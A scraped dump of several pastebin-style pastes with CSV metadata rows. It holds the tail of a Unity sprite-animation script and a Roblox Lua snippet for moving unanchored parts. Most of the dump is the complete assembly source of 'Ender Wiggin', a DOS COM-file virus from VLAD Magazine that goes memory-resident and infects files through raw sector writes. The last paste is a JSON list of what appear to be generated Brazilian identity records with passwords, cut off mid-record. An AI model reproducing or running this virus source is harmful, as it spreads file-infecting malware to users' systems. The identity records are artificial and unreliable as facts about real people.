        //split into x and y indexes. calculate the new offsets
        Vector2 offset = new Vector2((float)_index / _columns - (_index / _columns), //x index
                                      1 - ((_index / _columns) / (float)_rows));    //y index
 
        // Reset the y offset, if needed
        if (offset.y == 1)
            offset.y = 0.0f;
 
        // If we have scaled the texture, we need to reposition the texture to the center of the object
        offset.x += ((1f / _columns) - _textureSize.x) / 2.0f;
        offset.y += ((1f / _rows) - _textureSize.y) / 2.0f;
 
        // Add an additional offset if the user does not want the texture centered
        offset.x += _offset.x;
        offset.y += _offset.y;
 
        // Update the material
         GetComponent<Renderer>().sharedMaterial.SetTextureOffset(textureString, offset);
    }

//The following is an example of how to use the events:

void Start()
{
    if (_animatedTileTexture == null)
    {
        Debug.LogWarning(""No animated tile texture script assigned!"");
    }
    else
        _animatedTileTexture.RegisterCallback(AnimationFinished);
 
}
 
// This function will get called by the AnimatedTiledTexture script when the animation is completed if the EnableEvents option is set to true
void AnimationFinished()
{
        // The animation is finished
}
 
 public AnimateSpriteSheet _animatedTileTexture;    // A reference to AnimatedTileTexture object
}"
q3tVTVEP,Untitled,Thang112,JSON,Tuesday 4th of July 2023 09:43:57 AM CDT,"function CreateTpua()
mouse = game.Players.LocalPlayer:GetMouse()
tool = Instance.new(""Tool"")
tool.RequiresHandle = false
tool.Name = ""Create Tpua""
tool.Activated:connect(function()
if mouse.Target.Anchored == false then
if not mouse.Target:FindFirstChild(""BodyPosition"") then
BP = Instance.new(""BodyPosition"", mouse.Target)
BP.Position = mouse.Target.Position
BP.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
BP.D = _G.Bx
BP.P = _G.Tx
end end end)
tool.Parent = game.Players.LocalPlayer.Backpack
game.Players.LocalPlayer.Character.Humanoid:EquipTool(tool)
end
function MoveTpua()
mouse = game.Players.LocalPlayer:GetMouse()
tool = Instance.new(""Tool"")
tool.RequiresHandle = false
tool.Name = ""Move Tpua""
tool.Activated:connect(function()
local pos = mouse.Hit
pos = Vector3.new(pos.X,pos.Y,pos.Z)
for i,v in pairs(workspace:GetDescendants()) do
if v:IsA(""BodyPosition"") then 
v.Position = pos
end end end)
tool.Parent = game.Players.LocalPlayer.Backpack
game.Players.LocalPlayer.Character.Humanoid:EquipTool(tool)
end
function DeleteTpua()
mouse = game.Players.LocalPlayer:GetMouse()
tool = Instance.new(""Tool"")
tool.RequiresHandle = false
tool.Name = ""Delete Tpua""
tool.Activated:connect(function()
if mouse.Target.Anchored == false then
if mouse.Target:FindFirstChild(""BodyPosition"") then
mouse.Target.BodyPosition:Destroy()
end end end)
tool.Parent = game.Players.LocalPlayer.Backpack
game.Players.LocalPlayer.Character.Humanoid:EquipTool(tool)
end"
3R0cXWRz,VLAD Magazine - Issue #4 - ARTICLE.4_2 - Ender Wiggin,FlyFar,ASM (NASM),Tuesday 4th of July 2023 09:26:38 AM CDT,"; Ender Wiggin, a cluster-thingy by Rhincewind [Vlad]
;
; This virus infects COM files using sector reads and writes, but not using
; it's own file engine. Target files are opened using DOS. After that
; the SFT's are queried which contain all the cluster numbers relevant
; to infecting the file, being the first and last cluster. To get the last
; cluster number you must read from that cluster which will enter the number
; into the SFT's current cluster field. Infection is very straightforward
; otherwise. This hybrid file/sector-level infection evades most of the
; active file monitors, and thus a destructive stealth virus of this type
; is a possible threat especially since directory stealthing can now be
; done without risk or additional checks. Luckily, the larger the virus
; gets, the fewer files it will be able to infect.
; Setting the file's date/time to what it was in the first place forces a 
; directory entry rewrite which is vital to the infection.

                .model tiny
                .code
                .286
                org 100h
parasize        equ (endmem-start)
start:          push 100h
                mov ax, 3521h
                int 21h
                call next
next:           pop bp
                cmp ax, 2135h
                jz exit_loader
                mov [bp+(int21offset-next)],bx
                mov [bp+(int21seg-next)],es
                mov ah, 30h
                int 21h
                cmp al,4
                jb exit_loader
                push cs
                pop es
                mov ah, 4ah
                mov bx,-1
                push ax
                int 21h
                pop ax
                sub bx, parasize+2
                int 21h
                xor di,di
nextpsp:        cmp bx, word ptr ds:[di+16h]
                mov bx, word ptr ds:[di+16h]
                mov ds,bx
                jnz nextpsp
found_cmd:      mov ah, 50h
                int 21h
                mov ah, 48h
                mov bx,parasize+1
                int 21h
                sub ax,10h
                mov es,ax
                mov ah, 50h
                mov bx,cs
                int 21h
                push cs
                pop ds
                lea si, [bp-(next-start)]
                mov di,100h
                mov cx, endcopy-start
                rep movsb
                push es
                pop ds
                mov ax, 2521h
                mov dx, offset int21
                int 21h
exit_loader:    push cs
                push cs
                pop es
                pop ds
                lea si, [bp+(three_bytes-next)]
                mov di, 100h
                movsw
                movsb
                xor ax,ax
                xor bx,bx
                mov cx,00ffh
                cwd
                mov bp,ds
                xor si,si
                mov di,sp
                scasw
                ret
int21:          cmp ax, 3521h
                jnz no_residency_check
                pushf
                call dword ptr cs:int21offset
                xchg ah,al
                iret
no_residency_check:
                cmp ax, 4b00h
                jz infect_me_baby
                db 0eah
int21offset     dw ?
int21seg        dw ?
                db '-Ender Wiggin, by Rhince/VLAD-'
infect_me_baby: push ds
                push es
                pusha                
                mov ax, 3d00h
                int 21h
                jnc open_ok
                jmp jmp_int21
open_ok:        push ax
                xchg ax,bx
                mov ax, 440ah
                int 21h
                test dh,10000000b
                jz local_handle
                jmp close_exit
local_handle:   push cs
                pop es
                mov ah,60h
                mov si,dx
                mov di, offset endcopy
                int 21h
                push word ptr es:[di]
                push cs
                pop ds
                mov ax, 4202h
                mov cx,-1
                mov dx,cx
                int 21h
                mov ah,3fh
                neg cx
                mov dx, offset clust_read
                int 21h
                mov ax, 1220h
                int 2fh
                mov ax, 1216h
                mov bl, byte ptr es:[di]
                int 2fh
                mov fill_cs,cs
                pop dx
                sub dl,'A'-1
                mov ah, 32h
                int 21h
                mov ax, word ptr ds:[bx+0bh]
                mov cs:data_sec,ax
                mov cl, byte ptr ds:[bx+4]
                inc cl
                mov cs:sec_clust,cl
                dec dl
                mov bp,dx
                mov ax, word ptr ds:[bx+02]
                xor ch,ch
                mul cx
                cmp ax, 512*8
                ja go_close_exit
                cmp word ptr es:[di+13h],dx
                jnz go_close_exit
                xchg ax,bx
                mov ax, word ptr es:[di+11h]
                div bx
                push dx
                neg dx
                add dx,bx                     
                cmp dx, (endcopy-start)
                jb go_close_exit
                push cs
                pop ds
                mov ax, word ptr es:[di+0bh]
                call calc_sec
                int 25h
                popf
                pop dx
                mov ax, word ptr ds:[bx+(clust_read-secdata)]
                cmp ax, 'ZM'
                jz go_close_exit
                cmp ax, 'MZ'
                jnz no_close_exit
go_close_exit:  jmp close_exit
no_close_exit:  mov word ptr ds:[bx+(three_bytes-secdata)],ax
                mov ax, word ptr ds:[bx+(clust_read-secdata)+1]
                mov byte ptr ds:[bx+(three_bytes-secdata)+2],ah
                add ax, (endcopy-start)
                mov cx, word ptr es:[di+11h]
                sub cx,3
                cmp ax,cx
                jz go_close_exit
                mov byte ptr ds:[bx+(clust_read-secdata)],0e9h
                mov word ptr ds:[bx+(clust_read-secdata)+1],cx
                push dx
                call movez
                int 26h
                popf
                mov ax, word ptr es:[di+35h]
                call calc_sec
                int 25h
                popf
                mov dx,bx
                pop bx
                add bx, offset clust_read
                mov si, 100h
                mov cx, (endcopy-start)
copyloop:       lodsb
                mov byte ptr ds:[bx],al
                inc bx
                loop copyloop
                mov bx,dx
                call movez
                int 26h
                popf
                add word ptr es:[di+11h],(endcopy-start)
                adc word ptr es:[di+13h],0
close_exit:     pop bx
                mov ax, 5700h
                int 21h
                mov ax, 5701h
                int 21h
                mov ah, 3eh
                int 21h
jmp_int21:      popa
                pop es
                pop ds
                jmp dword ptr cs:int21offset
calc_sec:       mov bx, offset secdata
                dec ax
                dec ax
                mul word ptr ds:[sec_clust]
                add ax, data_sec
                adc dx, 0
                mov word ptr ds:[bx],ax
                mov word ptr ds:[bx+2],dx
movez:          mov bx, offset secdata
                xor cx,cx
                dec cx
                mov ax,bp
                ret
three_bytes     db 90h, 0cdh, 20h
secdata         dd 0
sec_clust       db 1                
                db 0
offzet          dw offset clust_read
endcopy:
fill_cs         dw ?    ;Doh I want relocation items.
data_sec        dw ?
clust_read:     db 512*8 dup (?)
endmem:
                end start"
WqnhMYdH,Untitled,Bosta_adm,JSON,Tuesday 4th of July 2023 09:25:48 AM CDT,"[
	{
		""nome"": ""Bryan Elias Fernando da Rocha"",
		""idade"": 18,
		""cpf"": ""795.885.946-50"",
		""rg"": ""40.256.812-6"",
		""data_nasc"": ""04/07/2005"",
		""sexo"": ""Masculino"",
		""signo"": ""Câncer"",
		""mae"": ""Esther Renata"",
		""pai"": ""Leonardo Márcio da Rocha"",
		""email"": ""bryan-darocha74@prestec.com.br"",
		""senha"": ""TDztiGlNQn"",
		""cep"": ""32400-970"",
		""endereco"": ""Rua Otacílio Negrão de Lima 135 Lojas 2 e 3"",
		""numero"": 466,
		""bairro"": ""Centro"",
		""cidade"": ""Ibirité"",
		""estado"": ""MG"",
		""telefone_fixo"": ""(31) 3510-5045"",
		""celular"": ""(31) 98773-9684"",
		""altura"": ""1,73"",
		""peso"": 78,
		""tipo_sanguineo"": ""A-"",
		""cor"": ""vermelho""
	},
	{
		""nome"": ""Enrico Yago Jesus"",
		""idade"": 18,
		""cpf"": ""649.368.636-96"",
		""rg"": ""21.776.312-1"",
		""data_nasc"": ""14/03/2005"",
		""sexo"": ""Masculino"",
		""signo"": ""Peixes"",
		""mae"": ""Adriana Allana"",
		""pai"": ""Samuel Alexandre Jorge Jesus"",
		""email"": ""enrico.yago.jesus@cassianoricardo.com.br"",
		""senha"": ""oKrXJNjZF0"",
		""cep"": ""32400-970"",
		""endereco"": ""Rua Otacílio Negrão de Lima 135 Lojas 2 e 3"",
		""numero"": 829,
		""bairro"": ""Centro"",
		""cidade"": ""Ibirité"",
		""estado"": ""MG"",
		""telefone_fixo"": ""(31) 3972-8106"",
		""celular"": ""(31) 98306-4621"",
		""altura"": ""1,95"",
		""peso"": 94,
		""tipo_sanguineo"": ""A-"",
		""cor"": ""preto""
	},
	{
		""nome"": ""Raimundo José Yuri Souza"",
		""idade"": 18,
		""cpf"": ""865.088.206-48"",
		""rg"": ""10.399.321-6"",
		""data_nasc"": ""20/03/2005"",
		""sexo"": ""Masculino"",
		""signo"": ""Peixes"",
		""mae"": ""Sônia Antônia Manuela"",
		""pai"": ""Giovanni Iago Bento Souza"",
		""email"": ""raimundo-souza82@maccropropaganda.com.br"",
		""senha"": ""3P7NO27ktN"",
		""cep"": ""32400-970"",
		""endereco"": ""Rua Otacílio Negrão de Lima 135 Lojas 2 e 3"",
		""numero"": 875,
		""bairro"": ""Centro"",
		""cidade"": ""Ibirité"",
		""estado"": ""MG"",
		""telefone_fixo"": ""(31) 3810-9405"",
		""celular"": ""(31) 98217-4166"",
		""altura"": ""1,62"",
		""peso"": 79,
		""tipo_sanguineo"": ""B+"",
		""cor"": ""vermelho""
	},
	{
		""nome"": ""Caleb Enzo Danilo Nunes"",
		""idade"": 18,
		""cpf"": ""198.920.186-56"",
		""rg"": ""21.951.578-5"",
		""data_nasc"": ""16/02/2005"",
		""sexo"": ""Masculino"",
		""signo"": ""Aquário"",
		""mae"": ""Helena Marcela Bianca"",
		""pai"": ""Jorge Theo Nunes"",
		""email"": ""caleb_nunes@gameecia.com.br"",
		""senha"": ""jrcsyOOxYg"",
		""cep"": ""32400-970"",
		""endereco"": ""Rua Otacílio Negrão de Lima 135 Lojas 2 e 3"",
		""numero"": 209,
		""bairro"": ""Centro"",
		""cidade"": ""Ibirité"",
		""estado"": ""MG"",
		""telefone_fixo"": ""(31) 2825-1370"",
		""celular"": ""(31) 99661-1163"",
		""altura"": ""1,85"",
		""peso"": 62,
		""tipo_sanguineo"": ""AB+"",
		""cor"": ""verde""
	},
	{
		""nome"": ""Iago Giovanni Sérgio Pires"",
		""idade"": 18,
		""cpf"": ""250.703.156-50"",
		""rg"": ""33.862.859-9"",
		""data_nasc"": ""24/06/2005"",
		""sexo"": ""Masculino"",
		""signo"": ""Câncer"",
		""mae"": ""Luciana Ana Márcia"",
		""pai"": ""Isaac Carlos Eduardo Pires"",
		""email"": ""iago_pires@caocarinho.com.br"",
		""senha"": ""s7cfmK9w88"",
		""cep"": ""32400-970"",
		""endereco"": ""Rua Otacílio Negrão de Lima 135 Lojas 2 e 3"",
		""numero"": 162,
		""bairro"": ""Centro"",
		""cidade"": ""Ibirité"",
		""estado"": ""MG"",
		""telefone_fixo"": ""(31) 3722-1159"",
		""celular"": ""(31) 98231-3188"",
		""altura"": ""1,74"",
		""peso"": 57,
		""tipo_sanguineo"": ""B+"",
		""cor"": ""amarelo""
	},
	{
		""nome"": ""Geraldo Pedro Henrique Geraldo Novaes"",
		""idade"": 18,
		""cpf"": ""776.591.386-77"",
		""rg"": ""48.357.493-4"",
		""data_nasc"": ""01/07/2005"",
		""sexo"": ""Masculino"",
		""signo"": ""Câncer"",
		""mae"": ""Regina Bianca Maria"",
		""pai"": ""Nelson Raul Novaes"",
		""email"": ""geraldo.pedro.novaes@amoreencantos.com"",
		""senha"": ""ZewJqFgk0A"",
		""cep"": ""32400-970"",
		""endereco"": ""Rua Otacílio Negrão de Lima 135 Lojas 2 e 3"",
		""numero"": 247,
		""bairro"": ""Centro"",
		""cidade"": ""Ibirité"",
		""estado"": ""MG"",
		""telefone_fixo"": ""(31) 2981-5339"",
		""celular"": ""(31) 99687-3999"",
		""altura"": ""1,92"",
		""peso"": 74,
		""tipo_sanguineo"": ""B+"",
		""cor"": ""vermelho""
	},
	{
		""nome"": ""André Bento Henry de Paula"",
		""idade"": 18,
		""cpf"": ""231.815.486-42"",
		""rg"": ""49.322.632-1"",
		""data_nasc"": ""11/01/2005"",
		""sexo"": ""Masculino"",
		""signo"": ""Capricórnio"",
		""mae"": ""Mariane Caroline Lavínia"",
		""pai"": ""Miguel Cauê Thiago de Paula"",
		""email"": ""andre_depaula@slb.com.br"",
		""senha"": ""NkptBkRt1u"",
		""cep"": ""32400-970"",
		""endereco"": ""Rua Otacílio Negrão de Lima 135 Lojas 2 e 3"",
		""numero"": 346,
		""bairro"": ""Centro"",
		""cidade"": ""Ibirité"",
		""estado"": ""MG"",
		""telefone_fixo"": ""(31) 2847-1631"",
		""celular"": ""(31) 98595-2055"",
		""altura"": ""1,85"",
		""peso"": 92,
		""tipo_sanguineo"": ""B-"",
		""cor"": ""laranja""
	},
	{
		""nome"": ""Nicolas Emanuel da Cunha"",
		""idade"": 18,
		""cpf"": ""911.007.956-42"",
		""rg"": ""41.736.437-4"",
		""data_nasc"": ""03/07/2005"",
		""sexo"": ""Masculino"",
		""signo"": ""Câncer"",
		""mae"": ""Alessandra Agatha"",
		""pai"": ""Daniel Igor da Cunha"",
		""email"": ""nicolas.emanuel.dacunha@eberlin.agr.br"",
		""senha"": ""xMLTRAbZIj"",
		""cep"": ""32400-970"",
		""endereco"": ""Rua Otacílio Negrão de Lima 135 Lojas 2 e 3"",
		""numero"": 280,
		""bairro"": ""Centro"",
		""cidade"": ""Ibirité"",
		""estado"": ""MG"",
		""telefone_fixo"": ""(31) 3905-2449"",
		""celular"": ""(31) 98620-6193"",
		""altura"": ""1,79"",
		""peso"": 86,
		""tipo_sanguineo"": ""AB-"",
		""cor"": ""azul""
	},
	{
		""nome"": ""Francisco Oliver Igor das Neves"",
		""idade"": 18,
		""cpf"": ""882.189.146-17"",
		""rg"": ""43.453.968-5"",
		""data_nasc"": ""03/07/2005"",
		""sexo"": ""Masculino"",
		""signo"": ""Câncer"",
		""mae"": ""Isabel Amanda Tatiane"",
		""pai"": ""Luiz Benjamin Breno das Neves"",
		""email"": ""franciscooliverdasneves@pibnet.com.br"",
		""senha"": ""eByRWTsOYa"",
		""cep"": ""32400-970"",
		""endereco"": ""Rua Otacílio Negrão de Lima 135 Lojas 2 e 3"",
		""numero"": 773,
		""bairro"": ""Centro"",
		""cidade"": ""Ibirité"",
		""estado"": ""MG"",
		""telefone_fixo"": ""(31) 2944-1069"",
		""celular"": ""(31) 98632-7737"",
		""altura"": ""1,73"",
		""peso"": 60,
		""tipo_sanguineo"": ""O+"",
		""cor"": ""azul""
	},
	{
		""nome"": ""Vinicius Marcelo Fábio Lima"",
		""idade"": 18,
		""cpf"": ""411.467.266-43"",
		""rg"": ""16.052.536-6"",
		""data_nasc"": ""07/05/2005"",
		""sexo"": ""Masculino"",
		""signo"": ""Touro"",
		""mae"": ""Sueli Aline"",
		""pai"": ""Heitor Henry Rodrigo Lima"",
		""email"": ""vinicius_lima@jetstar.com.br"",
		""senha"": ""Rq2MWoDRBt"",
		""cep"": ""32400-970"",
		""endereco"": ""Rua Otacílio Negrão de Lima 135 Lojas 2 e 3"",
		""numero"": 434,
		""bairro"": ""Centro"",
		""cidade"": ""Ibirité"",
		""estado"": ""MG"",
		""telefone_fixo"": ""(31) 2600-7125"",
		""celular"": ""(31) 98958-0421"",
		""altura"": ""1,71"",
		""peso"": 98,
		""tipo_sanguineo"": ""AB+"",
		""cor"": ""azul""
	},
	{
		""nome"": ""Severino Nelson Cardoso"",
		""idade"": 18,
		""cpf"": ""062.313.216-81"",
		""rg"": ""29.507.830-3"",
		""data_nasc"": ""03/07/2005"",
		""sexo"": ""Masculino"",
		""signo"": ""Câncer"",
		""mae"": ""Fernanda Vera"",
		""pai"": ""Calebe Severino Lorenzo Cardoso"",
		""email"": ""severino_nelson_cardoso@hotelruby.com.br"",
		""senha"": ""K0CxMePJ4g"",
		""cep"": ""32400-970"",
		""endereco"": ""Rua Otacílio Negrão de Lima 135 Lojas 2 e 3"",
		""numero"": 587,
		""bairro"": ""Centro"",
		""cidade"": ""Ibirité"",
		""estado"": ""MG"",
		""telefone_fixo"": ""(31) 3975-6850"",
		""celular"": ""(31) 98824-7483"",
		""altura"": ""1,67"",
		""peso"": 110,
		""tipo_sanguineo"": ""O-"",
		""cor"": ""verde""
	},
	{
		""nome"": ""Diogo Edson Galvão"",
		""idade"": 18,
		""cpf"": ""655.346.916-46"",
		""rg"": ""10.501.885-5"",
		""data_nasc"": ""14/05/2005"",
		""sexo"": ""Masculino"",
		""signo"": ""Touro"",
		""mae"": ""Raquel Isabel"",
		""pai"": ""Luan Francisco Galvão"",
		""email"": ""diogoedsongalvao@grupogil.com.br"",
		""senha"": ""A53STwrqiK"",
		""cep"": ""32400-970"",
		""endereco"": ""Rua Otacílio Negrão de Lima 135 Lojas 2 e 3"",
		""numero"": 273,
		""bairro"": ""Centro"",
		""cidade"": ""Ibirité"",
		""estado"": ""MG"",
		""telefone_fixo"": ""(31) 3618-1210"",
		""celular"": ""(31) 98122-5788"",
		""altura"": ""1,70"",
		""peso"": 104,
		""tipo_sanguineo"": ""A-"",
		""cor"": ""preto""
	},
	{
		""nome"": ""Thiago Antonio Assunção"",
		""idade"": 18,
		""cpf"": ""225.283.806-07"",
		""rg"": ""15.765.521-0"",
		""data_nasc"": ""19/04/2005"",
		""sexo"": ""Masculino"",
		""signo"": ""Áries"",
		""mae"": ""Nina Emilly"",
		""pai"": ""Matheus Osvaldo Victor Assunção"",
		""email"": ""thiagoantonioassuncao@br.ibm.com"",
		""senha"": ""tnNkEOX63A"",
		""cep"": ""32400-970"",
		""endereco"": ""Rua Otacílio Negrão de Lima 135 Lojas 2 e 3"",
		""numero"": 829,
		""bairro"": ""Centro"",
		""cidade"": ""Ibirité"",
		""estado"": ""MG"",
		""telefone_fixo"": ""(31) 2742-7885"",
		""celular"": ""(31) 99375-8778"",
		""altura"": ""1,86"",
		""peso"": 110,
		""tipo_sanguineo"": ""O+"",
		""cor"": ""amarelo""
	},
	{
		""nome"": ""Elias Luan Joaquim Campos"",
		""idade"": 18,
		""cpf"": ""433.813.946-30"",
		""rg"": ""33.318.654-0"",
		""data_nasc"": ""06/06/2005"",
		""sexo"": ""Masculino"",
		""signo"": ""Gêmeos"",
		""mae"": ""Melissa Tânia"",
		""pai"": ""Bryan Erick Campos"",
		""email"": ""elias_campos@arecocomercial.com.br"",
		""senha"": ""rxXDa6CMcB"",
		""cep"": ""32400-970"",
		""endereco"": ""Rua Otacílio Negrão de Lima 135 Lojas 2 e 3"",
		""numero"": 526,
		""bairro"": ""Centro"",
		""cidade"": ""Ibirité"",
		""estado"": ""MG"",
		""telefone_fixo"": ""(31) 3979-6598"",
		""celular"": ""(31) 99802-5251"",
		""altura"": ""1,93"",
		""peso"": 56,
		""tipo_sanguineo"": ""O+"",
		""cor"": ""vermelho""
	},
	{
		""nome"": ""Matheus Martin Silva"",
		""idade"": 18,
		""cpf"": ""305.417.456-54"",
		""rg"": ""41.767.273-1"",
		""data_nasc"": ""05/02/2005"",
		""sexo"": ""Masculino"",
		""signo"": ""Aquário"",
		""mae"": ""Andrea Luiza Cecília"",
		""pai"": ""Caio Juan Luís Silva"",
		""email"": ""matheusmartinsilva@boiago.com.br"",
		""senha"": ""JHy55aeCLq"",
		""cep"": ""32400-970"",
		""endereco"": ""Rua Otacílio Negrão de Lima 135 Lojas 2 e 3"",
		""numero"": 699,
		""bairro"": ""Centro"",
		""cidade"": ""Ibirité"",
		""estado"": ""MG"",
		""telefone_fixo"": ""(31) 2753-4491"",
		""celular"": ""(31) 99602-7056"",
		""altura"": ""1,98"",
		""peso"": 97,
		""tipo_sanguineo"": ""AB-"",
		""cor"": ""roxo""
	},
	{
		""nome"": ""Carlos Giovanni Mendes"",
		""idade"": 18,
		""cpf"": ""357.310.656-08"",
		""rg"": ""38.704.041-9"",
		""data_nasc"": ""26/03/2005"",
		""sexo"": ""Masculino"",
		""signo"": ""Áries"",
		""mae"": ""Rafaela Eloá Carolina"",
		""pai"": ""Kauê Leonardo Mendes"",
		""email"": ""carlos-mendes88@jovempanfmtaubate.com.br"",
		""senha"": ""I5qETOsZAz"",
		""cep"": ""32400-970"",
		""endereco"": ""Rua Otacílio Negrão de Lima 135 Lojas 2 e 3"",
		""numero"": 779,
		""bairro"": ""Centro"",
		""cidade"": ""Ibirité"",
		""estado"": ""MG"",
		""telefone_fixo"": ""(31) 2904-6792"",
		""celular"": ""(31) 99518-8927"",
		""altura"": ""1,82"",
		""peso"": 77,
		""tipo_sanguineo"": ""B-"",
		""cor"": ""vermelho""
	},
	{
		""nome"": ""Paulo Oliver Ricardo Cavalcanti"",
		""idade"": 18,
		""cpf"": ""395.467.626-52"",
		""rg"": ""32.815.200-6"",
		""data_nasc"": ""02/07/2005"",
		""sexo"": ""Masculino"",
		""signo"": ""Câncer"",
		""mae"": ""Joana Fátima Rosa"",
		""pai"": ""Rodrigo Noah Diogo Cavalcanti"",
		""email"": ""paulo-cavalcanti84@magicday.com.br"",
		""senha"": ""777fTzkiTA"",
		""cep"": ""32400-970"",
		""endereco"": ""Rua Otacílio Negrão de Lima 135 Lojas 2 e 3"",
		""numero"": 131,
		""bairro"": ""Centro"",
		""cidade"": ""Ibirité"",
		""estado"": ""MG"",
		""telefone_fixo"": ""(31) 2754-4126"",
		""celular"": ""(31) 99126-6759"",
		""altura"": ""1,81"",
		""peso"": 85,
		""tipo_sanguineo"": ""O-"",
		""cor"": ""roxo""
	},
	{
		""nome"": ""Rodrigo Enzo Benedito Figueiredo"",
		""idade"": 18,
		""cpf"": ""082.677.536-56"",
		""rg"": ""16.192.307-0"",
		""data_nasc"": ""21/03/2005"",
		""sexo"": ""Masculino"",
		""signo"": ""Áries"",
		""mae"": ""Rebeca Isabela"",
		""pai"": ""Osvaldo Henry Davi Figueiredo"",
		""email"": ""rodrigo-figueiredo90@yaooll.com"",
		""senha"": ""FeDghkMD9J"",
		""cep"": ""32400-970"",
		""endereco"": ""Rua Otacílio Negrão de Lima 135 Lojas 2 e 3"",
		""numero"": 816,
		""bairro"": ""Centro"",
		""cidade"": ""Ibirité"",
		""estado"": ""MG"",
		""telefone_fixo"": ""(31) 2620-1172"",
		""celular"": ""(31) 98686-3257"",
		""altura"": ""2,00"",
		""peso"": 88,
		""tipo_sanguineo"": ""AB-"",
		""cor"": ""verde""
	},
	{
		""nome"": ""Manoel Thales Cauã da Conceição"",
		""idade"": 18,
		""cpf"": ""428.761.936-63"",
		""rg"": ""33.705.452-6"",
		""data_nasc"": ""03/02/2005"",
		""sexo"": ""Masculino"",
		""signo"": ""Aquário"",
		""mae"": ""Fátima Priscila"",
		""pai"": ""Benedito Gabriel Vitor da Conceição"",
		""email"": ""manoelthalesdaconceicao@mv1.com.br"",
		""senha"": ""oqNT4P88Wd"",
		""cep"": ""32400-970"",
		""endereco"": ""Rua Otacílio Negrão de Lima 135 Lojas 2 e 3"",
		""numero"": 533,
		""bairro"": ""Centro"",
		""cidade"": ""Ibirité"",
		""estado"": ""MG"",
		""telefone_fixo"": ""(31) 3911-2602"",
		""celular"": ""(31) 99572-3865"",
		""altura"": ""1,95"",
		""peso"": 82,
		""tipo_sanguineo"": ""AB+"",
		""cor"": ""laranja""
	},
	{
		""nome"": ""Enzo Sérgio Dias"",
		""idade"": 18,
		""cpf"": ""239.807.396-35"",
		""rg"": ""28.250.810-7"",
		""data_nasc"": ""01/05/2005"",
		""sexo"": ""Masculino"",
		""signo"": ""Touro"",
		""mae"": ""Clara Isis Sandra"",
		""pai"": ""Nathan Alexandre Dias"",
		""email"": ""enzo-dias87@seraobenedito.com.br"",
		""senha"": ""gImrKExqmZ"",
		""cep"": ""32400-970"",
		""endereco"": ""Rua Otacílio Negrão de Lima 135 Lojas 2 e 3"",
		""numero"": 131,
		""bairro"": ""Centro"",
		""cidade"": ""Ibirité"",
		""estado"": ""MG"",
		""telefone_fixo"": ""(31) 2521-9884"",
		""celular"": ""(31) 98997-4519"",
		""altura"": ""1,69"",
		""peso"": 74,
		""tipo_sanguineo"": ""A+"",
		""cor"": ""vermelho""
	},
	{
		""nome"": ""Victor Mário Gomes"",
		""idade"": 18,
		""cpf"": ""004.627.096-55"",
		""rg"": ""44.847.801-8"",
		""data_nasc"": ""01/04/2005"",
		""sexo"": ""Masculino"",
		""signo"": ""Áries"",
		""mae"": ""Elza Rosângela Fátima"",
		""pai"": ""Nelson Edson Davi Gomes"",
		""email"": ""victor.mario.gomes@tasaut.com.br"",
		""senha"": ""ShuAP4Rq5h"",
		""cep"": ""32400-970"",
		""endereco"": ""Rua Otacílio Negrão de Lima 135 Lojas 2 e 3"",
		""numero"": 636,
		""bairro"": ""Centro"",
		""cidade"": ""Ibirité"",
		""estado"": ""MG"",
		""telefone_fixo"": ""(31) 2672-0417"",
		""celular"": ""(31) 99891-9849"",
		""altura"": ""1,99"",
		""peso"": 63,
		""tipo_sanguineo"": ""A+"",
		""cor"": ""roxo""
	},
	{
		""nome"": ""Tiago Guilherme Elias Martins"",
		""idade"": 18,
		""cpf"": ""973.211.146-19"",
		""rg"": ""44.005.995-1"",
		""data_nasc"": ""21/06/2005"",
		""sexo"": ""Masculino"",
		""signo"": ""Câncer"",
		""mae"": ""Jennifer Josefa Betina"",
		""pai"": ""Levi Enzo Martins"",
		""email"": ""tiago_guilherme_martins@unitau.br"",
		""senha"": ""QTiDA3UNc3"",
		""cep"": ""32400-970"",
		""endereco"": ""Rua Otacílio Negrão de Lima 135 Lojas 2 e 3"",
		""numero"": 788,
		""bairro"": ""Centro"",
		""cidade"": ""Ibirité"",
		""estado"": ""MG"",
		""telefone_fixo"": ""(31) 3724-3971"",
		""celular"": ""(31) 99302-5676"",
		""altura"": ""1,99"",
		""peso"": 106,
		""tipo_sanguineo"": ""A+"",
		""cor"": ""azul""
	},
	{
		""nome"": ""Luiz Matheus da Cruz"",
		""idade"": 18,
		""cpf"": ""214.929.716-77"",
		""rg"": ""40.580.952-9"",
		""data_nasc"": ""21/01/2005"",
		""sexo"": ""Masculino"",
		""signo"": ""Aquário"",
		""mae"": ""Sandra Sophia"",
		""pai"": ""Noah Calebe Emanuel da Cruz"",
		""email"": ""luiz_matheus_dacruz@claro.com.br"",
		""senha"": ""1AYUgd8Rfh"",
		""cep"": ""32400-970"",
		""endereco"": ""Rua Otacílio Negrão de Lima 135 Lojas 2 e 3"",
		""numero"": 600,
		""bairro"": ""Centro"",
		""cidade"": ""Ibirité"",
		""estado"": ""MG"",
		""telefone_fixo"": ""(31) 2732-1709"",
		""celular"": ""(31) 99441-9884"",
		""altura"": ""1,65"",
		""peso"": 72,
		""tipo_sanguineo"": ""A+"",
		""cor"": ""amarelo""
	},
	{
		""nome"": ""Breno Cláudio Oliveira"",
		""idade"": 18,
		""cpf"": ""416.165.506-19"",
		""rg"": ""20.339.689-3"",
		""data_nasc"": ""23/01/2005"",
		""sexo"": ""Masculino"",
		""signo"": ""Aquário"",
		""mae"": ""Elza Giovanna Mariah"",
		""pai"": ""Marcos Pietro Nathan Oliveira"",
		""email"": ""brenoclaudiooliveira@maptec.com.br"",
		""senha"": ""rT41mMs6bA"",
		""cep"": ""32400-970"",
		""endereco"": ""Rua Otacílio Negrão de Lima 135 Lojas 2 e 3"",
		""numero"": 780,
		""bairro"": ""Centro"",
		""cidade"": ""Ibirité"",
		""estado"": ""MG"",
		""telefone_fixo"": ""(31) 2544-2104"",
		""celular"": ""(31) 98631-2218"",
		""altura"": ""1,60"",
		""peso"": 57,
		""tipo_sanguineo"": ""A-"",
		""cor"": ""azul""
	},
	{
		""nome"": ""Noah Ian Vieira"",
		""idade"": 18,
		""cpf"": ""403.889.596-30"",
		""rg"": ""45.957.738-4"",
		""data_nasc"": ""10/02/2005"",
		""sexo"": ""Masculino"",
		""signo"": ""Aquário"",
		""mae"": ""Daiane Sara"",
		""pai"": ""Pedro Henrique Benedito Vieira"",
		""email"": ""noah.ian.vieira@krika.com.br"",
		""senha"": ""PO4ONs4ZPD"",
		""cep"": ""32400-970"",
		""endereco"": ""Rua Otacílio Negrão de Lima 135 Lojas 2 e 3"",
		""numero"": 947,
		""bairro"": ""Centro"",
		""cidade"": ""Ibirité"",
		""estado"": ""MG"",
